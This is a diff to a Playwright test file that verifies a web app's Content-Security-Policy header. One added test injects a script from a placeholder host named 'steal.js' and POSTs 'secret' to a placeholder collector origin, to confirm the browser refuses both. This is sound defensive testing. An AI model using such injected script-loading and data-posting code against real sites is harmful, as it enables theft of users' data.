@@ -31,18 +31,52 @@ def test_a_page_does_not_name_its_server() -> None:
     assert "x-powered-by" not in headers_of(f"{WEB_BASE}/")
 
 
+def directives(policy: str) -> dict[str, list[str]]:
+    return {name: values for name, *values in (part.split() for part in policy.split(";"))}
+
+
 def test_a_page_says_what_it_may_not_load(page) -> None:
-    """§860: a Content-Security-Policy, for the parts nothing here needs -
-    and a page that still works under it, framing its own pages included."""
-    got = headers_of(f"{WEB_BASE}/")
-    assert got.get("content-security-policy") == [
-        "object-src 'none'; base-uri 'self'; form-action 'self'; frame-ancestors 'self'"]
+    """§860, §993: a Content-Security-Policy - and a page that still works
+    under it. Every signed-in browser test checks the second half too
+    (conftest's `_signed_in`)."""
+    [policy] = headers_of(f"{WEB_BASE}/").get("content-security-policy", [])
+    got = directives(policy)
+    # `next dev`'s policy, which is the build's plus hot reload's eval and
+    # socket (apps/web/src/lib/csp.test.ts holds the two together).
+    assert got["script-src"] == ["'self'", "'unsafe-inline'", "'unsafe-eval'"]
+    assert got["connect-src"] == ["'self'", "https://*.amazoncognito.com", "ws:", "wss:"]
+    assert got["object-src"] == ["'none'"] and got["frame-ancestors"] == ["'self'"]
     violations: list[str] = []
     page.on("console", lambda m: violations.append(m.text)
             if "Content Security Policy" in m.text else None)
     page.goto(f"{WEB_BASE}/home")
     page.get_by_role("heading", name="Choose a workspace").wait_for()
     assert violations == []
+
+
+def test_a_script_from_elsewhere_is_not_run_and_nothing_is_sent_elsewhere(page) -> None:
+    """What the policy is for: something that did get into a page can
+    neither load a script from another origin nor post what it read to one.
+    Both are refused by the browser before any request leaves it."""
+    page.goto(f"{WEB_BASE}/home")
+    page.get_by_role("heading", name="Choose a workspace").wait_for()
+    refused = page.evaluate("""() => new Promise((resolve) => {
+        const seen = [];
+        document.addEventListener("securitypolicyviolation", (e) => {
+            seen.push(e.effectiveDirective);
+            if (seen.length === 2) resolve(seen.sort());
+        });
+        const script = document.createElement("script");
+        script.src = "https://scripts.example.invalid/steal.js";
+        document.head.appendChild(script);
+        fetch("https://collector.example.invalid/", {method: "POST", body: "secret"})
+            .catch(() => {});
+        setTimeout(() => resolve(seen.sort()), 5000);
+    })""")
+    assert refused == ["connect-src", "script-src-elem"]
+    # Every other test fails on a refusal (conftest's `_signed_in`); here
+    # they are the point.
+    page.csp_violations.clear()  # type: ignore[attr-defined]
 
 
 def test_an_api_answer_through_the_web_origin_carries_each_once() -> None:
